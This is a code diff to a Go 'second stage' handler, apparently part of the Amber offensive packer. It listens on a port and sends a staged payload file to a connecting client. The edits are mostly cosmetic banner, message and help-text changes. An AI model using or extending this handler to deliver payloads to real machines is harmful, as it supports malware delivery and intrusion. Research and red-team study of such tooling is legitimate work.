@@ -35,6 +35,8 @@ func main() {
     	os.Exit(0)
   	}
 
+	Banner()
+
   	for i := 0; i < len(ARGS); i++{
   		if ARGS[i] == "-p" || ARGS[i] == "--port" {
   			tmp, Err := strconv.Atoi(ARGS[i+1])
@@ -63,14 +65,14 @@ func main() {
        	fmt.Println(sockErr)
        	os.Exit(1) 			
   	}
-  	BoldYellow.Print("[*] Listening on port ",PORT,"\n")
+  	BoldYellow.Print("\n[*] Listening on port ",PORT,"\n")
   	conn, connErr := sock.Accept()
   	if connErr != nil {
         BoldRed.Println("\n[!] ERROR: Connection error.\n")
        	fmt.Println(connErr)
        	os.Exit(1) 			
   	}
-  	BoldYellow.Print("[*] Sending second stage (",len(File),")\n")  	
+  	BoldYellow.Print("[*] Sending second stage (",len(File)," bytes)\n")  	
   	conn.Write([]byte(stageSize))
   	conn.Write(File)
 
@@ -83,13 +85,13 @@ func Banner() {
 
   	var BANNER string = `
 
-
-//    _____         ___.                    ___ ___                    .___.__                
-//   /  _  \   _____\_ |__   ___________   /   |   \_____    ____    __| _/|  |   ___________ 
-//  /  /_\  \ /     \| __ \_/ __ \_  __ \ /    ~    \__  \  /    \  / __ | |  | _/ __ \_  __ \
-// /    |    \  Y Y  \ \_\ \  ___/|  | \/ \    Y    // __ \|   |  \/ /_/ | |  |_\  ___/|  | \/
-// \____|__  /__|_|  /___  /\___  >__|     \___|_  /(____  /___|  /\____ | |____/\___  >__|   
-//         \/      \/    \/     \/               \/      \/     \/      \/           \/       
+//                
+// AMBER ___                    .___.__                
+//  /   |   \_____    ____    __| _/|  |   ___________ 
+// /    ~    \__  \  /    \  / __ | |  | _/ __ \_  __ \
+// \    Y    // __ \|   |  \/ /_/ | |  |_\  ___/|  | \/
+//  \___|_  /(____  /___|  /\____ | |____/\___  >__|   
+//        \/      \/     \/      \/           \/       
 // 
 //  POC handler For ReplaceProcess                                             
 `
@@ -105,15 +107,10 @@ func Help() {
    var Help string = `
 
 USAGE: 
-  amber file.stage [options]
-
-OPTIONS:  
-  -p, --port             Custom cipher key
-  -h, --help             Show this massage
+  handler <stage> [port]
 
 EXAMPLE:
-  (Default settings if no option parameter passed)
-  amber file.stage -p 4444
+  handler file.stage 4444
 
 `
   color.Green(Help)
